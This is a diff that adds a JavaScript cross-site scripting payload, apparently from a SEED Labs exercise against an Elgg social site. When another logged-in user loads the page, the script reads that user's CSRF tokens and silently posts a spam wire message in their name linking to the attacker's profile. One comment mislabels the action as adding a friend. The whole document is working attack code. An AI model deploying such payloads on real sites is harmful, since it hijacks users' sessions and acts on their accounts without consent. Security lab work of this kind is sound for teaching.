@@ -1,0 +1,22 @@
+<script type="text/javascript">
+	window.onload = function () {
+		var Ajax = null;
+		var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+		//Construct the HTTP request to add Samy as a friend.
+
+		var sendurl = "http://www.seed-server.com/action/thewire/add";
+      
+
+        var content = ts+token+ "&body=To earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/samy"  ;
+
+		if (elgg.session.user.guid != 59) {
+			//Create and send Ajax request to add friend
+			Ajax = new XMLHttpRequest();
+			Ajax.open("POST", sendurl, true);
+			Ajax.setRequestHeader("Host", "www.seed-server.com");
+			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			Ajax.send(content);
+		}
+	}
+</script>
